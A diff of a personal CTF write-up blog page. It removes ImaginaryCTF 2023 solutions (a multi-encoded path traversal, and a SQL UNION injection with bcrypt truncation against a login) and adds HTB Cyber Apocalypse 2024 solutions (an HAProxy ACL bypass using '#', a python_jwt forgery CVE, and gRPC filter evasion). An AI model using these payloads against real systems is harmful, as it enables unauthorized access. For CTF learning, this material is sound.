-<p>php  urldecode() only decodes once i.e  it only decodes one layer , so if i  encode on several layers i can bypass the filter which only decoded 2 layers</p>
-<p>the flag was at ../../../../flag.png according to the dockerfile , urlencode this 3 times and send it to get the flag</p>
-<p><img src="/images/ImaCTF2023/roks_burp.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="burp"
-	
-	
-></p>
-<hr>
-<h4 id="login">Login</h4>
-<p>This challenge tested knowledge in sql and bcrypt hashing.</p>
-<p>Using sqlmap you could extract the database table users and data</p>
-<p><img src="/images/ImaCTF2023/sqlmap.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="sqlmap"
-	
-	
-></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">
-pwhash,username
-<span class="nv">$2</span>y<span class="nv">$10$vw1OC907</span>/WpJagql/LmHV.7zs8I3RE9N0BC4/Tx9I90epSI2wr3S.,guest
-<span class="nv">$2</span>y<span class="nv">$10$Is00vB1hRNHYBl9BzJwDouQFCU85YyRjJ81q0CX1a3sYtvsZvJudC</span>,admi
-
-</code></pre></td></tr></table>
-</div>
-</div><p>the hashes are clearly bcrypt</p>
-<p>to login as admin we can use the following sql statement. I got it from &raquo; <a class="link" href="https://stackoverflow.com/questions/50756182/sql-injection-with-password-verify"  target="_blank" rel="noopener"
-    >here</a>   . Here we can set our own bcrypt hash  which we have knowledge of the password.</p>
+<h4 id="locktalk">Locktalk</h4>
+<p>rating: medium</p>
+<p>This is where things got interesting.</p>
+<p>Here you are given a webapplication with an api blueprint.</p>
+<p>The api had three routes:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -749,31 +699,124 @@ pwhash,username
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="w">
-</span><span class="w"></span><span class="n">xxx</span><span class="s1">&#39; UNION SELECT &#39;</span><span class="k">admin</span><span class="s1">&#39; AS username,&#39;</span><span class="err">$</span><span class="mi">2</span><span class="n">y$10$C4lfi0f8kouggVBFkKF1ru</span><span class="p">.</span><span class="o">/</span><span class="n">NEQTKqptjJCh6JI</span><span class="o">/</span><span class="n">hJieELWHLeFXi</span><span class="s1">&#39; AS pwhash--
-</span><span class="s1">
-</span><span class="s1">
-</span><span class="s1">and the password as &#34;a&#34;
-</span><span class="s1">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">/flag   protected by middleware
+
+/chat/&lt;int:chat_id&gt;  protected by middleware
+
+/get_ticket  open but blocked by ha proxy
+
+</code></pre></td></tr></table>
 </div>
-</div><p>Here we get the magic , in my case it was &ldquo;688a35c685a7a654abc80f8e123ad9f0&rdquo;</p>
-<p><img src="/images/ImaCTF2023/magic.png"
+</div><p>A quick look at the proxy configuration</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">frontend haproxy
+    bind 0.0.0.0:1337
+    default_backend backend
+
+    http-request deny if { path_beg,url_dec -i /api/v1/get_ticket }
+
+</code></pre></td></tr></table>
+</div>
+</div><p>So we had to find a way to bypass this. I used a lot of time on this part. Until i found this &raquo; <a class="link" href="https://www.haproxy.com/blog/december-2023-cve-2023-45539-haproxy-accepts-as-part-of-the-uri-component-fixed#:~:text=HAProxy%20before%202.8.,png%20to%20a%20static%20server."  target="_blank" rel="noopener"
+    >here</a></p>
+<p>To make your search easier you had to find the ha proxy version from the dockerfile : PS i had forgotten do thsi , it could have made my work easier.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">WORKDIR /tmp
+RUN wget https://www.haproxy.org/download/2.8/src/haproxy-2.8.1.tar.gz &amp;&amp; \
+    tar zxvf haproxy-*.tar.gz &amp;&amp; cd haproxy-* &amp;&amp; \
+    make TARGET=linux-musl &amp;&amp; \
+    make install
+RUN rm -rf *
+
+</code></pre></td></tr></table>
+</div>
+</div><p>From the article if we make a request to /api/v1/get_ticket we get denied but if we make request to /api/v1/get_ticket# we bypass the acl.</p>
+<p>From here i gotr the jwt token. I tries common methos of exploiting jwt but none of them worked. UNtil i searched for a vulnerability in python_jwt==3.3.3 from the requirements.txt</p>
+<p>I found this vulnerability that enables us to bypass the jwt verification &raquo; <a class="link" href="https://github.com/advisories/GHSA-5p8v-58qm-c7fp"  target="_blank" rel="noopener"
+    >here</a> and for the exploit &raquo; <a class="link" href="https://github.com/user0x1337/CVE-2022-39227"  target="_blank" rel="noopener"
+    >here</a></p>
+<p><img src="/images/ca2024/ha.png"
 	
 	
 	
 	loading="lazy"
 	
-		alt="magic"
+		alt="exp"
 	
 	
 ></p>
-<p>In the code if we supply the magic as a get parameter  the flag will be appended to the password , Bcrypt has a character limit of 72 , so if we set a password of more than 72 characters it will be truncated and only the first 72 characters will be hashed as the password . I had seen technique in an ippsec video recently  <a class="link" href="https://www.youtube.com/watch?v=E5TOeiCnGkE&amp;t=3183s"  target="_blank" rel="noopener"
-    >https://www.youtube.com/watch?v=E5TOeiCnGkE&amp;t=3183s</a> , Luckyme :)</p>
-<p>Anyways here is the exploit &raquo; <a class="link" href="https://github.com/f0rk3b0mb/ImaginaryCTF_login"  target="_blank" rel="noopener"
-    >here</a></p>
-<p>flag :   ictf{why_are_bcrypt_truncating_my_passwords?!}</p>
+<p>We change our role to administrator and then read the flag</p>
+<p>flag: HTB{h4Pr0Xy_n3v3r_D1s@pp01n4s}</p>
+<p><img src="/images/ca2024/pyjwt.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="flag"
+	
+	
+></p>
 <hr>
+<h4 id="testimonial">Testimonial</h4>
+<p>Here we are given a webapplication that accepts parameters customer and testimonial.</p>
+<p>It is a go webapplication witha  grpc endpoint. I saw some people asking on the discord why there were two ip addresses. One if for the main webapp  and one was for grpc. Read more about grpc &raquo; <a class="link" href="https://google.com"  target="_blank" rel="noopener"
+    >here</a></p>
+<p>Ive encountered with grpc before. So the tools we will need are grpcurl and grpcui. In this context grpcui will not work.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">grpcurl  -plaintext  -import-path ./  -proto ptypes.proto -d &#39;{&#34;customer&#34;: &#34;examplecusomer&#34;, &#34;testimonial&#34;: &#34;exampletestimonial&#34;}&#39; 94.237.59.119:45387 RickyService.SubmitTestimonial
+
+</code></pre></td></tr></table>
+</div>
+</div><p>Above is the format for grpcurl. Breakdown:</p>
+<ul>
+<li>
+<p>ptypes.proto file is in the pb folder . This is used to enable grpcurl to interact with the server since service enumaration was disables . This is what caused grpcui not to work.</p>
+</li>
+<li>
+<p>The service and method name can be found in the source code.</p>
+</li>
+</ul>
+<p>Using this will also enable you to bypass the filter that was placed in the code</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">for _, char := range []string{&#34;/&#34;, &#34;\\&#34;, &#34;:&#34;, &#34;*&#34;, &#34;?&#34;, &#34;\&#34;&#34;, &#34;&lt;&#34;, &#34;&gt;&#34;, &#34;|&#34;, &#34;.&#34;} {
+		customer = strings.ReplaceAll(customer, char, &#34;&#34;)
+	}
+
+</code></pre></td></tr></table>
+</div>
+</div><p>NOTE: Beyond this point i did after the ctf , i did not solve this one.</p>
 
 </section>
 
@@ -807,25 +850,6 @@ pwhash,username
     <h2 class="section-title">Related content</h2>
     <div class="related-content">
         <div class="flex article-list--tile">
-            
-                
-<article class="has-image">
-    <a href="/p/htb_cyberapocalypse_2024/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="/cover/ca2024.png" loading="lazy" data-key="" data-hash="/cover/ca2024.png"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">HTB_cyberapocalypse_2024</h2>
-        </div>
-    </a>
-</article>
-
             
                 
 <article class="has-image">
@@ -898,6 +922,25 @@ pwhash,username
 
         <div class="article-details">
             <h2 class="article-title">Blackhat_mea_2023</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/shehacks_intrervasity_2023/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/cover/shehacks.png" loading="lazy" data-key="" data-hash="/cover/shehacks.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Shehacks_intrervasity_2023</h2>
         </div>
     </a>
 </article>
